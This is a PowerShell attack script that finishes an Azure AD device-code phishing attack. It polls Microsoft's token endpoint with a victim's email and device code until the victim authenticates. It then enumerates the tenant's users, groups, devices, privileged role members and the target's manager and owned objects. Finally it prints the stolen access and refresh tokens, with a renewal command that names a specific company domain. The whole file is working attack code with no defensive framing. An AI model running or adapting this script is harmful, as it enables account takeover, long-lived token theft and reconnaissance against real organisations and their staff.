<#
Start-Transcript -Path C:\Temp\
Stop-Transcript

.\Checkauth.ps1
#>
Write-Warning "[!] Ensure 'Start-Transcript -Path <...>' is executed. Run 'Stop-Transcript' after execution completes."
Write-Warning "[!] Ensure TokenTactics is present in the same directory"
Write-Warning "[!] Ensure script is updated with victim EMAIL & DEVICE_CODE"


#Content of script begins
#MODIFY EMAIL & DEVICE_CODE HERE
$email = "<Victim Email ID>"

$continue = $true
$interval = "5"
$expires =  "900"

Write-Host "[+] Importing TokenTactics"
Import-Module .\TokenTactics.psd1

Write-Host "[+] Importing Azure AD"
Import-Module AzureAD

Write-Host "=====================================================================================================`n`n"

# Create body for authentication requests

$body=@{
	"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" = "<Enter CODE>"
	"resource" =   "https://graph.microsoft.com"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Timeout occurred"
		return
	}
				
	# Try to get the response. Will give 40x while pending so we need to try&catch

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# This is normal flow, always returns 40x unless successful

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# Not pending so this is a real error

			Write-Error $details.error_description
			return
		}
	}

	# If we got response, all okay!

	if($response)
	{	
		Write-Host "[+] Tokens received! Authenticated to Azure AD as $email"		
		break # Exit the loop

	}
}

$connection = Connect-AzureAD -AadAccessToken $response.access_token -AccountId $email
Write-Output $connection

Write-Host "[+] Initiating Domain Enumeration"

#User enumeration
Write-Host "`n[+] Extracting AD Users"
#$allusers = Get-AzureADUser -All $true
#Write-Host "`n[+] $allusers.Count users found"

Write-Host "`nDisplaying user information - Limiting to 10`n"
Get-AzureADUser -Top 10 | Select DisplayName, UserPrincipalName, UserType

#Group Enumeration
Write-Host "=====================================================================================================`n`n[+] Extracting AD Groups"
#$allgroups = Get-AzureADGroup -All $true
#Write-Host "`n[+] " + $allgroups.Count + " groups found"

Write-Host "`nDisplaying group information - Limiting to 10"
Get-AzureADGroup -Top 10 | Select DisplayName, Description

#Device Enumeration
Write-Host "=====================================================================================================`n`n[+] Extracting registered devices"
#$alldevices = Get-AzureADDevice -All $true
#Write-Host "`n[+] " + $alldevices.Count + " devices found"

Write-Host "Displaying device names - Limiting to 10"
Get-AzureADDevice -Top 10 | Select DisplayName

#Targeted User Enumeration
Write-Host "==========================================================================================================================================================================================================`n[+] Initiating targetted user enumeration"

#Display user's groups
Write-Host "=====================================================================================================`n`n[+] Identifying user's group memberships"
$objectid = (Get-AzureADUser -ObjectId $email).ObjectId
Get-AzureADUserMembership -ObjectId $objectid | Select DisplayName, Description

#Display user's extension
Write-Host "=====================================================================================================`n`n[+] Identifying user's extension"
Get-AzureADUserExtension -ObjectId $objectid

#Display User's manager
Write-Host "=====================================================================================================`n`n[+] Identifying security products in target environment, user's manager, Company details"
Get-AzureADUserManager -ObjectId $objectid | Select AssignedPlans, PhysicalDeliveryOfficeName, City, Country,PostalCode,CompanyName, Department, DisplayName, JobTitle,UserPrincipalName,Mail, MailNickName, Mobile, OnPremisesSecurityIdentifier

#Registered Device Name
Write-Host "=====================================================================================================`n`n[+] Identifying user's device name"
Get-AzureADUserOwnedDevice -ObjectId $objectid | Select DeviceId, DisplayName

#Display owned objects
Write-Host "=====================================================================================================`n`n[+] Identifying objects owned by user"
Get-AzureADUserOwnedObject -ObjectId $objectid  | Select ObjectType,Description,Mail

#Privileged User Enumeration
Write-Host "=====================================================================================================`n`n[+] Identifying users with privileged roles"

Get-AzureADDirectoryRole | Foreach-Object {
  $Role = $_
  $RoleMembers = Get-AzureADDirectoryRoleMember -ObjectId $Role.ObjectID
  ForEach ($Member in $RoleMembers){
  $RoleMembership = [PSCustomObject]@{
  MemberName = $Member.DisplayName
  MemberID = $Member.ObjectID
  MemberOnPremID = $Member.OnPremisesSecurityIdentifier
  MemberUPN = $Member.UserPrincipalName
  MemberType = $Member.ObjectType
  RoleID = $Role.RoleTemplateID
  RoleName = Get-AzureADDirectoryRole | ?{$_.RoleTemplateId -eq $Role.RoleTemplateID} | Select DisplayName
  }
  $RoleMembership
 }
}
Write-Host $RoleMembership

Write-Host "`n`n[+] Access Token: "
Write-Host $response.access_token
Write-Host "`n[+] Refresh Token: "
Write-Host $response.refresh_token
Write-Host "`nAccess Token valid for about 60 minutes.`nIf expired, use the Refresh Token to renew access tokens. (Valid for over 90 days)`nRefreshTo-GraphToken  -domain americana-food.com -refreshToken $refresh_token`nConnect-AzureAD -AadAccessToken $GraphToken.access_token -AccountId $email"

Write-Host "`n`n======== To better visualize enumerated information, import data into AzureHound ======="